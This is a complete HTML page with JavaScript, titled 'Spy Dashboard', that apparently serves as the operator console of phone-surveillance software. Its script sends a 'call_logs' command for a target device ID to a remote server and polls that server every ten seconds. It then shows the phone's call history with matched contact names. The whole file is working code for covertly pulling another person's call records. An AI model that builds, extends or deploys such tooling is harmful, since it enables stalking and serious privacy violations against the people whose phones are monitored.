<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Call History - Spy Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --glass-bg: rgba(28, 28, 30, 0.6);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text-main: #ffffff;
            --text-sub: #8e8e93;
            --incoming: #30d158;
            --outgoing: #0a84ff;
            --missed: #ff453a;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(135deg, #000000 0%, #1c1c1e 100%);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0; padding: 20px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 480px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 40px; padding: 20px;
            min-height: 85vh;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 20px; padding: 0 10px 15px 10px;
            border-bottom: 0.5px solid var(--glass-border);
        }

        .back-btn {
            color: var(--text-main); font-size: 1.1rem;
            text-decoration: none; width: 35px; height: 35px;
            display: flex; align-items: center; justify-content: center;
        }

        .page-title { font-size: 1.1rem; font-weight: 600; letter-spacing: 0.5px; }
        
        .refresh-btn {
            background: transparent; border: none;
            color: var(--text-main); font-size: 1.1rem; cursor: pointer;
        }

        .log-list { 
            display: flex; flex-direction: column; gap: 0px; 
            max-height: 650px; overflow-y: auto; 
        }
        
        .log-list::-webkit-scrollbar { width: 0px; background: transparent; }

        .log-card {
            padding: 12px 10px;
            display: flex; align-items: center;
            border-bottom: 0.5px solid rgba(255,255,255,0.1);
            transition: 0.2s;
        }
        
        .log-card:active { background: rgba(255,255,255,0.1); }

        .log-icon {
            font-size: 0.9rem; margin-right: 15px; width: 30px; height: 30px;
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.05);
        }
        
        .log-icon.incoming { color: var(--text-main); }
        .log-icon.outgoing { color: var(--text-main); }
        .log-icon.missed { color: var(--missed); }

        .log-info { flex: 1; overflow: hidden; display: flex; flex-direction: column; justify-content: center; }
        
        .log-name { 
            font-size: 1.05rem; font-weight: 600; 
            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
            color: var(--text-main);
            display: flex; align-items: center; gap: 6px;
        }
        
        .log-name.is-missed { color: var(--missed); }

        .name-icon { font-size: 0.8rem; opacity: 0.7; }

        .log-details-row {
            display: flex; align-items: center; gap: 6px;
            font-size: 0.8rem; color: var(--text-sub); margin-top: 3px;
        }

        .call-action {
            width: 40px; height: 40px;
            display: flex; align-items: center; justify-content: center;
            color: var(--outgoing);
            font-size: 1.2rem;
            text-decoration: none;
            margin-left: 10px;
            background: rgba(255,255,255,0.05);
            border-radius: 50%;
        }

        .status-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Recents</span>
            <button onclick="fetchLogs()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i></button>
        </div>

        <div class="log-list" id="logsContainer">
            </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        const DEVICE_ID = urlParams.get('id');
        const storageKey = `calls_${DEVICE_ID}`;
        let cachedContacts = [];

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                alert("ID Missing! Redirecting...");
                window.location.href = "index.html";
                return;
            }
            detectContactsData();
            loadFromStorage();
            sendCommand();
            setTimeout(fetchLogs, 2000); 
            setInterval(fetchLogs, 10000);
        });

        // 1. Contacts Detector
        function detectContactsData() {
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.toLowerCase().includes("contact")) {
                        const rawData = localStorage.getItem(key);
                        if (rawData) {
                            const parsed = JSON.parse(rawData);
                            if (Array.isArray(parsed) && parsed.length > 0 && (parsed[0].name || parsed[0].phone)) {
                                cachedContacts = parsed;
                                return;
                            }
                        }
                    }
                }
            } catch (e) { console.error("Contacts error", e); }
        }

        // 2. Name Matcher
        function findContactName(phoneNumber) {
            if (!cachedContacts || cachedContacts.length === 0) return null;
            try {
                const cleanLogNum = phoneNumber.replace(/\D/g, '').slice(-10); 
                const match = cachedContacts.find(c => {
                    if(!c.phone && !c.number) return false;
                    const contactPhone = c.phone || c.number || "";
                    const cleanContactNum = contactPhone.toString().replace(/\D/g, '').slice(-10);
                    return cleanContactNum === cleanLogNum;
                });
                return match ? (match.name || match.display_name) : null;
            } catch (e) { return null; }
        }

        // --- 3. FIX: SMART DATE FORMATTER (Solves 1970 Issue) ---
        function formatSmartDate(timestamp) {
            if (!timestamp) return "Unknown";
            
            // Convert to Number safely
            let timeNum = Number(timestamp);
            
            // FIX: Agar timestamp chota hai (seconds mein hai), to usko milliseconds banao
            // 1000000000000 ka matlab hai Year 2001. Agar usse kam hai, to definitely seconds hain.
            if (timeNum < 1000000000000) {
                timeNum = timeNum * 1000;
            }

            const date = new Date(timeNum);
            
            // Invalid Date check
            if (isNaN(date.getTime())) return "Invalid Date";

            const now = new Date();
            const yesterday = new Date(now);
            yesterday.setDate(yesterday.getDate() - 1);

            const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });

            if (date.toDateString() === now.toDateString()) {
                return `Today, ${timeStr}`;
            } else if (date.toDateString() === yesterday.toDateString()) {
                return `Yesterday, ${timeStr}`;
            } else {
                return date.toLocaleDateString() + ", " + timeStr;
            }
        }

        function loadFromStorage() {
            const savedData = localStorage.getItem(storageKey);
            if (savedData) {
                renderLogs(JSON.parse(savedData));
            } else {
                document.getElementById("logsContainer").innerHTML = `
                    <div class="status-msg">
                        <i class="fa-solid fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
                        <p>Loading History...</p>
                    </div>`;
            }
        }

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'call_logs' })
            });
        }

        function fetchLogs() {
            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${new Date().getTime()}`)
                .then(response => response.json())
                .then(data => {
                    if (data && data.length > 0) {
                        localStorage.setItem(storageKey, JSON.stringify(data));
                        detectContactsData();
                        renderLogs(data);
                    }
                })
                .catch(err => console.log("Silent refresh failed"));
        }

        function renderLogs(data) {
            const container = document.getElementById("logsContainer");
            if(!container) return;
            container.innerHTML = ""; 

            // Sort logic: Latest call upar
            // Date logic ko yahan bhi apply karna padega sort ke liye
            data.sort((a, b) => {
                let dateA = Number(a.date) < 1000000000000 ? Number(a.date) * 1000 : Number(a.date);
                let dateB = Number(b.date) < 1000000000000 ? Number(b.date) * 1000 : Number(b.date);
                return dateB - dateA;
            });

            data.forEach(log => {
                const type = (log.type || "").toLowerCase();
                let iconClass = "incoming";
                let iconSymbol = "fa-arrow-down";
                let isMissed = false;

                if(type.includes("outgoing")) {
                    iconClass = "outgoing";
                    iconSymbol = "fa-arrow-up";
                } else if(type.includes("missed") || type.includes("rejected")) {
                    iconClass = "missed";
                    iconSymbol = "fa-xmark";
                    isMissed = true;
                }

                const matchedName = findContactName(log.number);
                const nameColorClass = isMissed ? "is-missed" : "";

                let mainText = "";
                let subText = "";
                let mainIcon = ""; 

                if (matchedName) {
                    mainText = matchedName;
                    subText = "Mobile • " + log.number;
                    mainIcon = `<i class="fa-solid fa-user name-icon" style="margin-right:5px;"></i>`;
                } else {
                    mainText = log.number;
                    subText = "Unsaved";
                    mainIcon = `<i class="fa-solid fa-mobile-screen name-icon" style="margin-right:5px;"></i>`;
                }

                const prettyDate = formatSmartDate(log.date);

                container.innerHTML += `
                    <div class="log-card">
                        <div class="log-icon ${iconClass}">
                            <i class="fa-solid ${iconSymbol}"></i>
                        </div>
                        <div class="log-info">
                            <div class="log-name ${nameColorClass}">
                                ${mainIcon} ${mainText}
                            </div>
                            <div class="log-details-row">
                                <span>${subText}</span>
                                <span>•</span>
                                <span>${prettyDate}</span>
                            </div>
                        </div>
                        <a href="tel:${log.number}" class="call-action">
                            <i class="fa-solid fa-phone"></i>
                        </a>
                    </div>`;
            });
        }
    </script>
</body>
</html>
